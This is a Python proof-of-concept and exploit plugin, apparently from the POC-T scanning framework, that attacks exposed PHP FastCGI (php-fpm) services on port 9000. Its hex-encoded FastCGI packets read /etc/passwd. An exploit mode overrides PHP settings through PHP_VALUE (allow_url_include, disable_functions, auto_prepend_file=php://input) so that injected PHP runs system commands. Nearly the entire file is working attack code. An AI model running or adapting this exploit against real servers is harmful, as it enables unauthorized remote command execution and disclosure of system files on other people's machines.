#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
PHP FastCGI Fileread/RCE PoC & Exp
"""

from plugin.util import randomString
import socket

PORT = 9000

EXPLOIT = False  # set "True" to exec system commands
COMMAND = 'whoami'
PHP_FILE_PATH = '/usr/share/php/PEAR.php'
FLAG = randomString(10) if EXPLOIT else ':root:'


def poc(ip):
    payload = exp_data() if EXPLOIT else poc_data()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3.0)
    try:
        sock.connect((ip, PORT))
        sock.send(payload)
        ret = sock.recv(1024)
        sock.close()

        if ret.find(FLAG):
            return ip + ' -> ' +ret.split(FLAG)[1] if EXPLOIT else True
    except Exception, e:
        sock.close()

    return False


def exp_data():
    post_data = "<?php echo('" + FLAG + "');system('" + COMMAND + "');die('" + FLAG + "');?>"

    data1 = """
    01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00
    01 04 00 01 01 14 04 00 0e 04 52 45 51 55 45 53
    54 5f 4d 45 54 48 4f 44 50 4f 53 54 09 5b 50 48
    50 5f 56 41 4c 55 45 61 6c 6c 6f 77 5f 75 72 6c
    5f 69 6e 63 6c 75 64 65 20 3d 20 4f 6e 0a 64 69
    73 61 62 6c 65 5f 66 75 6e 63 74 69 6f 6e 73 20
    3d 20 0a 73 61 66 65 5f 6d 6f 64 65 20 3d 20 4f
    66 66 0a 61 75 74 6f 5f 70 72 65 70 65 6e 64 5f
    66 69 6c 65 20 3d 20 70 68 70 3a 2f 2f 69 6e 70
    75 74 0f 17 53 43 52 49 50 54 5f 46 49 4c 45 4e
    41 4d 45
    """
    data2 = """
    0d 01 44 4f 43 55
    4d 45 4e 54 5f 52 4f 4f 54 2f 0f 10 53 45 52 56
    45 52 5f 53 4f 46 54 57 41 52 45 67 6f 20 2f 20
    66 63 67 69 63 6c 69 65 6e 74 20 0b 09 52 45 4d
    4f 54 45 5f 41 44 44 52 31 32 37 2e 30 2e 30 2e
    31 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43
    4f 4c 48 54 54 50 2f 31 2e 31 0e 02 43 4f 4e 54
    45 4e 54 5f 4c 45 4e 47 54 48
    """
    data3 = """
    00 00 00 00
    01 04 00 01 00 00 00 00 01 05 00 01 00 47 01 00
    """
    data4 = """
    00
    """
    datablock = data_sort(data1)
    datablock += PHP_FILE_PATH.strip()
    datablock += data_sort(data2)
    datablock += str(len(post_data))
    datablock += data_sort(data3)
    datablock += post_data
    datablock += data_sort(data4)

    return datablock


def poc_data():
    data = """
    01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00
    01 04 00 01 00 8f 01 00 0e 03 52 45 51 55 45 53
    54 5f 4d 45 54 48 4f 44 47 45 54 0f 08 53 45 52
    56 45 52 5f 50 52 4f 54 4f 43 4f 4c 48 54 54 50
    2f 31 2e 31 0d 01 44 4f 43 55 4d 45 4e 54 5f 52
    4f 4f 54 2f 0b 09 52 45 4d 4f 54 45 5f 41 44 44
    52 31 32 37 2e 30 2e 30 2e 31 0f 0b 53 43 52 49
    50 54 5f 46 49 4c 45 4e 41 4d 45 2f 65 74 63 2f
    70 61 73 73 77 64 0f 10 53 45 52 56 45 52 5f 53
    4f 46 54 57 41 52 45 67 6f 20 2f 20 66 63 67 69
    63 6c 69 65 6e 74 20 00 01 04 00 01 00 00 00 00
    """
    return data_sort(data)


def data_sort(data):
    return ''.join([chr(int(_, 16)) for _ in data.split()])
